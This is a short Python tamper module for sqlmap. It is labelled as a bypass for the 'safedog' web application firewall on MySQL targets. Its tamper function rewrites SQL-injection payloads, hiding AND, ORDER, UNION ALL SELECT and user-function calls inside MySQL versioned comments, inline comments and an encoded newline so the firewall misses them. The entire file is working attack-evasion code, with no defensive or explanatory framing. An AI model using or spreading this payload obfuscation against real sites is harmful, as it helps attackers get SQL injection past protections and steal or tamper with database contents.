#!/usr/bin/env python
#coding:utf-8
"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
Author:pureqh.top
"""

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
import os

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("Bypass safedog by pureqh'%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    payload=payload.replace('AND','/*!11444AND*/')
    payload=payload.replace('ORDER','order/*!80000aaa*/')
    payload=payload.replace('USER())','hex(user/**/()))')
    payload=payload.replace('SESSION_USER()','hex(SESSION_USER(-- B%0a))')
    payload=payload.replace('UNION ALL SELECT','union/*!80000aaa*/select/*!80000aaa*/')
    return payload